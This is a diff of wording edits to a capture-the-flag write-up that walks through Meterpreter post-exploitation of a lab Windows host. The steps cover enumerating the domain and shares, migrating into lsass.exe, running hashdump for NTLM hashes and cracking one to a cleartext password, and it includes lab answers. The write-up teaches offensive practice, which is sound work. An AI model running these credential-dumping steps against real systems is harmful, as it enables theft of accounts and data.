@@ -125,15 +125,15 @@ ACME-TEST
 
 5.2: What is the target domain?
 
-To get this information we need to push the current meterpreter shell to the background and use "post/windows/gather/enum_domain".
+To get this information we need to push the current meterpreter shell to the background for a second so we can use the "post/windows/gather/enum_domain" module.
 ```
 background
 ```
-Alternatively, we can use
+Alternatively, we can use:
 ```
 Ctrl + Z
 ```
-Now that the process is running in the background we proceed to use the "enum_domain" module.
+Now that the process is running in the background, we may proceed with the "enum_domain" module.
 ```
 use post/windows/gather/enum_domain
 ```
@@ -155,29 +155,29 @@ FLASH
 
 5.3: What is the name of the share likely created by the user? 
 
-As per the hint, we need to use the "post/windows/gather/enum_shares" module to get this information.
+As per the hint, module "post/windows/gather/enum_shares" will get us this information.
 ```
 use post/windows/gather/enum_shares
 ```
-Once again, the only setting we need to set before running the exploit is called "SESSION".
+Once again, the only setting we need before running the exploit is called "SESSION".
 ```
 set SESSION 1
 run
 ```
 ![image](https://user-images.githubusercontent.com/14150485/170660492-07368442-3ced-4838-bcdc-4455534c71e5.png)
 
-Looks like there are 3 shares available, the one created by the user should be in lowercase.
+Looks like there are 3 shares available, the one created by the user is likely in lowercase.
 ```
 speedster
 ```
 
 5.4: What is the NTLM hash of the jchambers user?
 
-Resume the meterpreter session we pushed to the background in 5.2.
+Resume the meterpreter session running in the background.
 ```
 session -i 1
 ```
-Per the hint on this task, we need to migrate the "lsass.exe" process. However we need to find its number first.
+Per the hint on this task, we need to migrate the "lsass.exe" process. However, we first need to find its number.
 ```
 ps aux | grep -iF 'lsass.exe'
 ```
@@ -190,7 +190,7 @@ migrate PIDNUMBER
 ![image](https://user-images.githubusercontent.com/14150485/170661843-3dd1bd2e-4bf9-4073-af8a-d8507644aeb1.png)
 
 
-We may now get the hash dump.
+Now for the hash dump.
 ```
 hashdump
 ```
@@ -201,7 +201,7 @@ hashdump
 
 5.5: What is the cleartext password of the jchambers user?
 
-For this one we can simply check the hash on CrackStation.
+A simple hash check on CrackStation should suffice.
 
 ![image](https://user-images.githubusercontent.com/14150485/170662318-b98261e7-b2b6-4d0a-9ee0-98537f7e5d68.png)
 
@@ -214,11 +214,11 @@ Trustno1
 ```
 search -f secrets.txt
 ```
-The file is located in the "C:\Program Files (x86)\Windows Multimedia Platform" folder.
+The file is located in the "C:\Program Files (x86)\Windows Multimedia Platform\" folder.
 
 ![image](https://user-images.githubusercontent.com/14150485/170663807-4eceae66-9e14-47f5-b626-484aa333e454.png)
 ```
-C:\Program Files (x86)\Windows Multimedia Platform
+C:\Program Files (x86)\Windows Multimedia Platform\
 ```
 
 5.7: What is the Twitter password revealed in the "secrets.txt" file?
@@ -236,11 +236,11 @@ KDSvbsw3849!
 search -f realsecret.txt
 ```
 
-The "realsecret.txt" file is located under the "c:\inetpub\wwwroot\" folder.
+The "realsecret.txt" file is located under the "C:\inetpub\wwwroot\" folder.
 
 ![image](https://user-images.githubusercontent.com/14150485/170664342-1fa9a5af-84bb-4a5f-9382-77f1cd16bb58.png)
 ```
-c:\inetpub\wwwroot\
+C:\inetpub\wwwroot\
 ```
 
 5.9: What is the real secret? 
